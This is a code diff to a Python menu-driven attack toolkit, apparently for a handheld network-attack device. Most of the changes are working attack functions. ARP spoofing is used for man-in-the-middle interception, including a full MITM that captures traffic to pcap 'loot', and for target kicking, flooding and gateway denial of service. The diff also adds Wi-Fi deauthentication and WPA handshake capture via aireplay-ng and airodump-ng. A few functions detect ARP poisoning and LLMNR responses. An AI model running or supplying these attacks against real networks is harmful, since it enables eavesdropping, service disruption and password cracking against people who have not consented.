@@ -946,30 +946,37 @@ def do_network_scan():
 def do_arp_kick(target_ip):
     iface = ktox_state["iface"]
     gw    = ktox_state["gateway"]
-    _run_attack("ARP KICK", [
-        "bash", "-c",
-        f"echo 'Kicking {target_ip} via {iface}'"
-        f"; while true; do"
-        f"  arpspoof -i {iface} -t {target_ip} {gw} 2>&1 | head -2"
-        f"  ; sleep 2"
-        f"; done"
-    ])
+    subprocess.run(["pkill", "-9", "arpspoof"],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.Popen(["arpspoof", "-i", iface, "-t", target_ip, gw],
+                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    ktox_state["running"] = "ARP KICK"
+    Dialog_info(f"ARP KICK active\n{target_ip}\nKEY3=stop", wait=True)
+    subprocess.run(["pkill", "-9", "arpspoof"],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    ktox_state["running"] = None
+    Dialog_info("Kick stopped.", wait=False, timeout=1)
+
+
 def do_mitm(target_ip):
     iface = ktox_state["iface"]
     gw    = ktox_state["gateway"]
-    _run_attack("ARP MITM", [
-        "bash", "-c",
-        f"echo 1 > /proc/sys/net/ipv4/ip_forward"
-        f"; echo 'MITM: {target_ip} <-> {gw}'"
-        f"; arpspoof -i {iface} -t {target_ip} {gw} 2>/dev/null &"
-        f"; PID1=$!"
-        f"; arpspoof -i {iface} -t {gw} {target_ip} 2>/dev/null &"
-        f"; PID2=$!"
-        f"; echo 'Forwarding ON — KEY3 to stop'"
-        f"; wait $PID1 $PID2"
-        f"; echo 0 > /proc/sys/net/ipv4/ip_forward"
-        f"; echo 'Done'"
-    ])
+    subprocess.run(["pkill", "-9", "arpspoof"],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    subprocess.Popen(["arpspoof", "-i", iface, "-t", target_ip, gw],
+                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.Popen(["arpspoof", "-i", iface, "-t", gw, target_ip],
+                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    ktox_state["running"] = "MITM"
+    Dialog_info(f"MITM active\n{target_ip}\nFwd ON\nKEY3=stop", wait=True)
+    subprocess.run(["pkill", "-9", "arpspoof"],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+    ktox_state["running"] = None
+    Dialog_info("MITM stopped.\nFwd OFF.", wait=False, timeout=1)
+
+
 def do_wifi_monitor_on():
     Dialog_info("Enabling\nmonitor mode…", wait=False, timeout=1)
     _run(["airmon-ng","check","kill"], timeout=10)
@@ -1015,43 +1022,54 @@ def do_wifi_scan():
 def do_arp_watch():
     _run_attack("ARP WATCH", [
         "python3", "-c",
-        "from scapy.all import sniff, ARP\n"  # scapy OK here — runs in subprocess after boot
-        "known = {}\n"
-        "def h(p):\n"
-        "    if ARP in p and p[ARP].op == 2:\n"
-        "        ip = p[ARP].psrc; mac = p[ARP].hwsrc\n"
-        "        if ip in known and known[ip] != mac:\n"
-        "            print(f'! POISON {ip}  {known[ip][:11]} -> {mac[:11]}')\n"
-        "        known[ip] = mac\n"
-        "print('Watching ARP... KEY3 to stop')\n"
-        "sniff(prn=h, filter='arp', store=0)\n"
-    ])
-def do_arp_diff():
-    _run_attack("ARP DIFF", [
-        "python3", "-c",
         "import subprocess, time\n"
+        "print('ARP Watch — KEY3=stop')\n"
         "def snap():\n"
-        "    out = subprocess.check_output(['arp','-an'], text=True, timeout=5)\n"
+        "    out = subprocess.check_output(['arp','-an'],text=True,timeout=5)\n"
         "    t = {}\n"
         "    for ln in out.splitlines():\n"
         "        p = ln.split()\n"
         "        try:\n"
-        "            ip = p[1].strip('()'); mac = p[3]\n"
-        "            if mac != '<incomplete>': t[ip] = mac\n"
+        "            ip=p[1].strip('()'); mac=p[3]\n"
+        "            if mac!='<incomplete>': t[ip]=mac\n"
         "        except: pass\n"
         "    return t\n"
-        "base = snap()\n"
+        "base=snap(); print(f'Baseline: {len(base)} entries')\n"
+        "while True:\n"
+        "    time.sleep(8); cur=snap()\n"
+        "    for ip,mac in cur.items():\n"
+        "        if ip in base and base[ip]!=mac:\n"
+        "            print(f'! POISON {ip} {base[ip][:11]}->{mac[:11]}')\n"
+        "        elif ip not in base:\n"
+        "            print(f'+ NEW {ip} {mac}')\n"
+        "    base=cur\n"
+    ])
+def do_arp_diff():
+    _run_attack("ARP DIFF",[
+        "python3","-c",
+        "import subprocess,time\n"
+        "def arp():\n"
+        "  out=subprocess.check_output(['arp','-an'],text=True)\n"
+        "  t={}\n"
+        "  for line in out.splitlines():\n"
+        "    p=line.split()\n"
+        "    try:\n"
+        "      ip=p[1].strip('()');mac=p[3]\n"
+        "      if mac!='<incomplete>':t[ip]=mac\n"
+        "    except:pass\n"
+        "  return t\n"
+        "base=arp()\n"
         "print(f'Baseline: {len(base)} entries')\n"
         "while True:\n"
-        "    time.sleep(5); cur = snap()\n"
-        "    for ip, mac in cur.items():\n"
-        "        if ip in base and base[ip] != mac:\n"
-        "            print(f'! CHANGE {ip}  {base[ip][:11]} -> {mac[:11]}')\n"
-        "            base[ip] = mac\n"
-        "        elif ip not in base:\n"
-        "            print(f'+ NEW {ip}  {mac}')\n"
-        "            base[ip] = mac\n"
+        "  time.sleep(5);cur=arp()\n"
+        "  for ip,mac in cur.items():\n"
+        "    if ip in base and base[ip]!=mac:\n"
+        "      print(f'! CHANGE {ip} {base[ip][:11]} -> {mac[:11]}');base[ip]=mac\n"
+        "    elif ip not in base:\n"
+        "      print(f'+ NEW {ip} {mac}');base[ip]=mac"
     ])
+
+
 def do_rogue_detect():
     gw  = ktox_state["gateway"]
     net = gw.rsplit(".",1)[0]+".0/24" if gw else "192.168.1.0/24"
@@ -1075,12 +1093,21 @@ while True:
 
 
 def do_llmnr_detect():
-    _run_attack("LLMNR DETECT", [
-        "bash", "-c",
-        "echo 'Monitoring LLMNR port 5355...'"
-        "; tcpdump -l -n udp port 5355 2>/dev/null"
-        " | while IFS= read -r ln; do echo \"~ $ln\"; done"
+    _run_attack("LLMNR DETECT",[
+        "python3","-c",
+        "from scapy.all import sniff,UDP,DNS,IP\n"
+        "def h(p):\n"
+        "  if UDP in p and p[UDP].dport==5355:\n"
+        "    if DNS in p:\n"
+        "      src=p[IP].src if IP in p else '?'\n"
+        "      if p[DNS].qr==1: print(f'! RESPONSE {src} possible poison')\n"
+        "      else:\n"
+        "        qn=p[DNS].qd.qname.decode(errors='ignore') if p[DNS].qd else '?'\n"
+        "        print(f'~ QUERY {src} {qn}')\n"
+        "sniff(filter='udp and port 5355',prn=h,store=0)"
     ])
+
+
 def do_responder_on():
     iface = ktox_state["iface"]
     rpy   = f"{INSTALL_PATH}Responder/Responder.py"
@@ -1141,10 +1168,6 @@ def do_baseline_export():
     Dialog_info(f"✔ Saved:\nbaseline_{ts[:8]}\n{len(data['hosts'])} hosts", wait=True)
 
 
-def do_start_mitm_suite():
-    exec_payload(os.path.join(KTOX_DIR, "ktox_mitm.py"))
-
-
 def do_dns_spoofing():
     sites = sorted([
         d for d in os.listdir(f"{INSTALL_PATH}DNSSpoof/sites")
@@ -1173,6 +1196,142 @@ def do_dns_spoof_stop():
     subprocess.run("pkill -f 'ettercap'", shell=True,
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     Dialog_info("DNS Spoof\nstopped.", wait=True)
+
+def do_start_mitm_suite():
+    """Full on-device MITM: pick host, ARP poison both ways, tcpdump capture."""
+    tgt = _pick_host()
+    if not tgt:
+        return
+    iface = ktox_state["iface"]
+    gw    = ktox_state["gateway"]
+    if not gw:
+        Dialog_info("No gateway!\nRun scan first.", wait=True)
+        return
+    if not YNDialog("FULL MITM", y="Yes", n="No", b=f"{tgt}\nAll traffic?"):
+        return
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    subprocess.run(["pkill", "-9", "arpspoof"],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.Popen(["arpspoof", "-i", iface, "-t", tgt, gw],
+                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.Popen(["arpspoof", "-i", iface, "-t", gw, tgt],
+                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
+    pcap = f"{LOOT_DIR}/mitm_{ts}.pcap"
+    os.makedirs(LOOT_DIR, exist_ok=True)
+    subprocess.Popen(["tcpdump", "-i", iface, "-w", pcap, "-q"],
+                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    ktox_state["running"] = "MITM SUITE"
+    Dialog_info(f"MITM ACTIVE\n{tgt}\nCapturing...\nKEY3=stop", wait=True)
+    subprocess.run(["pkill", "-9", "arpspoof"],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.run(["pkill", "-9", "tcpdump"],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+    ktox_state["running"] = None
+    Dialog_info(f"MITM stopped.\nPCAP: {os.path.basename(pcap)}", wait=True)
+
+
+def do_deauth_targeted():
+    """Scan APs, pick one, run continuous deauth until KEY3."""
+    mon = ktox_state.get("mon_iface")
+    if not mon:
+        Dialog_info("Enable monitor\nmode first.", wait=True)
+        return
+    Dialog_info("Scanning APs\n10 seconds...", wait=False, timeout=1)
+    import glob, csv
+    ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
+    tmp = f"/tmp/ktox_scan_{ts}"
+    os.makedirs(tmp, exist_ok=True)
+    proc = subprocess.Popen(
+        ["airodump-ng", "--write", f"{tmp}/s", "--output-format", "csv",
+         "--write-interval", "5", mon],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(10)
+    proc.terminate()
+    aps = []
+    for cp in glob.glob(f"{tmp}/s*.csv"):
+        try:
+            for row in csv.reader(open(cp, errors="ignore")):
+                if len(row) < 14: continue
+                bssid=row[0].strip(); ch=row[3].strip(); essid=row[13].strip()
+                if bssid and ":" in bssid and bssid!="BSSID" and ch.isdigit():
+                    aps.append((bssid, ch, essid[:14] or "hidden"))
+        except Exception: pass
+    if not aps:
+        Dialog_info("No APs found.\nTry again.", wait=True)
+        return
+    items = [f" {e}  ch{c}" for b,c,e in aps]
+    sel   = GetMenuString(items)
+    if not sel: return
+    bssid, ch, essid = aps[items.index(sel)]
+    if not YNDialog("DEAUTH", y="Yes", n="No", b=f"{essid}\nch{ch}?"):
+        return
+    subprocess.run(["pkill", "-9", "aireplay-ng"],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    proc2 = subprocess.Popen(
+        ["aireplay-ng", "--deauth", "0", "-a", bssid, mon],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    ktox_state["running"] = "DEAUTH"
+    Dialog_info(f"DEAUTH active\n{essid}\nch{ch}\nKEY3=stop", wait=True)
+    proc2.terminate()
+    subprocess.run(["pkill", "-9", "aireplay-ng"],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    ktox_state["running"] = None
+    Dialog_info("Deauth stopped.", wait=False, timeout=1)
+
+
+def do_handshake_targeted():
+    """Scan APs, pick one, capture WPA handshake via forced deauth."""
+    mon = ktox_state.get("mon_iface")
+    if not mon:
+        Dialog_info("Enable monitor\nmode first.", wait=True)
+        return
+    Dialog_info("Scanning APs\n10 seconds...", wait=False, timeout=1)
+    import glob, csv
+    ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
+    tmp = f"/tmp/ktox_hs_{ts}"
+    os.makedirs(tmp, exist_ok=True)
+    proc = subprocess.Popen(
+        ["airodump-ng", "--write", f"{tmp}/s", "--output-format", "csv",
+         "--write-interval", "5", mon],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(10)
+    proc.terminate()
+    aps = []
+    for cp in glob.glob(f"{tmp}/s*.csv"):
+        try:
+            for row in csv.reader(open(cp, errors="ignore")):
+                if len(row) < 14: continue
+                bssid=row[0].strip(); ch=row[3].strip(); essid=row[13].strip()
+                if bssid and ":" in bssid and bssid!="BSSID" and ch.isdigit():
+                    aps.append((bssid, ch, essid[:14] or "hidden"))
+        except Exception: pass
+    if not aps:
+        Dialog_info("No APs found.", wait=True)
+        return
+    items = [f" {e}  ch{c}" for b,c,e in aps]
+    sel   = GetMenuString(items)
+    if not sel: return
+    bssid, ch, essid = aps[items.index(sel)]
+    if not YNDialog("HANDSHAKE", y="Yes", n="No", b=f"{essid}\nch{ch}?"):
+        return
+    out_ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
+    outdir  = f"{LOOT_DIR}/handshakes"
+    os.makedirs(outdir, exist_ok=True)
+    outpath = f"{outdir}/hs_{essid.replace(' ','_')}_{out_ts}"
+    cap = subprocess.Popen(
+        ["airodump-ng", "-c", ch, "--bssid", bssid, "-w", outpath, mon],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(3)
+    subprocess.run(["aireplay-ng", "--deauth", "4", "-a", bssid, mon],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    Dialog_info(f"Capturing HS\n{essid}\nKEY3=stop\n~30 sec", wait=True)
+    cap.terminate()
+    subprocess.run(["pkill", "-9", "airodump-ng"],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    Dialog_info(f"Saved:\nhs_{essid[:14]}\nUse aircrack-ng", wait=True)
+
 
 # ═══════════════════════════════════════════════════════════════════════════════
 # ── Payload directory scanner ──────────────────────────────────────────────────
@@ -1259,8 +1418,8 @@ class KTOxMenu:
             (" Enable Monitor",  do_wifi_monitor_on),
             (" Disable Monitor", do_wifi_monitor_off),
             (" WiFi Scan",       do_wifi_scan),
-            (" Deauth (Payload)",partial(exec_payload,"interception/deauth")),
-            (" Handshake Cap",   self._handshake),
+            (" Deauth AP",       do_deauth_targeted),
+            (" Handshake Cap",   do_handshake_targeted),
             (" PMKID Attack",    self._pmkid),
             (" Evil Twin AP",    self._evil_twin),
             (" Select Adapter",  self._select_adapter),
@@ -1503,19 +1662,18 @@ class KTOxMenu:
     def _arp_flood(self):
         tgt   = _pick_host()
         iface = ktox_state["iface"]
-        gw    = ktox_state["gateway"]
         if tgt and YNDialog("ARP FLOOD", y="Yes", n="No", b=f"Flood {tgt}?"):
-            _run_attack("ARP FLOOD", [
-                "bash", "-c",
-                f"echo 'ARP flooding {tgt}'"
-                f"; n=1"
-                f"; while true; do"
-                f"  arpspoof -i {iface} -t {tgt} 10.0.0.$n 2>/dev/null &"
-                f"  P=$!; sleep 0.1; kill $P 2>/dev/null"
-                f"  ; n=$((n % 253 + 1))"
-                f"  ; [ $((n % 25)) -eq 0 ] && echo \"Sent $n flood pkts\""
-                f"; done"
-            ])
+            subprocess.run(["pkill", "-9", "arpspoof"],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            for fake in [f"10.0.0.{i}" for i in range(1, 20)]:
+                subprocess.Popen(["arpspoof", "-i", iface, "-t", tgt, fake],
+                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            ktox_state["running"] = "ARP FLOOD"
+            Dialog_info(f"ARP FLOOD\n{tgt}\n20 sources\nKEY3=stop", wait=True)
+            subprocess.run(["pkill", "-9", "arpspoof"],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            ktox_state["running"] = None
+            Dialog_info("Flood stopped.", wait=False, timeout=1)
     def _gw_dos(self):
         gw    = ktox_state["gateway"]
         iface = ktox_state["iface"]
@@ -1523,17 +1681,17 @@ class KTOxMenu:
             Dialog_info("No gateway!", wait=True)
             return
         if YNDialog("GW DoS", y="Yes", n="No", b=f"DoS {gw}?"):
-            _run_attack("GW DoS", [
-                "bash", "-c",
-                f"echo 'DoS on {gw}'"
-                f"; n=1"
-                f"; while true; do"
-                f"  arpspoof -i {iface} -t {gw} 10.33.0.$n 2>/dev/null &"
-                f"  P=$!; sleep 0.05; kill $P 2>/dev/null"
-                f"  ; n=$((n % 253 + 1))"
-                f"  ; [ $((n % 50)) -eq 0 ] && echo \"Sent $n pkts\""
-                f"; done"
-            ])
+            subprocess.run(["pkill", "-9", "arpspoof"],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            for fake in [f"10.33.0.{i}" for i in range(1, 20)]:
+                subprocess.Popen(["arpspoof", "-i", iface, "-t", gw, fake],
+                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            ktox_state["running"] = "GW DoS"
+            Dialog_info(f"GW DoS active\n{gw}\nKEY3=stop", wait=True)
+            subprocess.run(["pkill", "-9", "arpspoof"],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            ktox_state["running"] = None
+            Dialog_info("DoS stopped.", wait=False, timeout=1)
     def _arp_cage(self):
         tgt   = _pick_host()
         gw    = ktox_state["gateway"]
@@ -1541,28 +1699,25 @@ class KTOxMenu:
         if not tgt or not gw:
             return
         if YNDialog("ARP CAGE", y="Yes", n="No", b=f"Cage {tgt}?"):
-            _run_attack("ARP CAGE", [
-                "bash", "-c",
-                f"echo 'Caging {tgt}'"
-                f"; arpspoof -i {iface} -t {tgt} {gw} 2>/dev/null &"
-                f"; PID1=$!"
-                f"; arpspoof -i {iface} -t {gw} {tgt} 2>/dev/null &"
-                f"; PID2=$!"
-                f"; echo 'Cage ACTIVE — KEY3 to release'"
-                f"; wait $PID1 $PID2"
-                f"; echo 'Cage released'"
-            ])
+            subprocess.run(["pkill", "-9", "arpspoof"],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.Popen(["arpspoof", "-i", iface, "-t", tgt, gw],
+                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.Popen(["arpspoof", "-i", iface, "-t", gw, tgt],
+                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            ktox_state["running"] = "ARP CAGE"
+            Dialog_info(f"Cage ACTIVE\n{tgt}\nisolated\nKEY3=release", wait=True)
+            subprocess.run(["pkill", "-9", "arpspoof"],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            ktox_state["running"] = None
+            Dialog_info("Cage released.", wait=False, timeout=1)
     def _ntlm(self):
         self.navigate("resp")
 
     # ── WiFi actions ──────────────────────────────────────────────────────────
 
     def _handshake(self):
-        mon = ktox_state.get("mon_iface")
-        if not mon:
-            Dialog_info("Enable monitor\nmode first.", wait=True)
-            return
-        exec_payload("wifi/wifi_handshake_capture")
+        do_handshake_targeted()
 
     def _pmkid(self):
         mon = ktox_state.get("mon_iface")
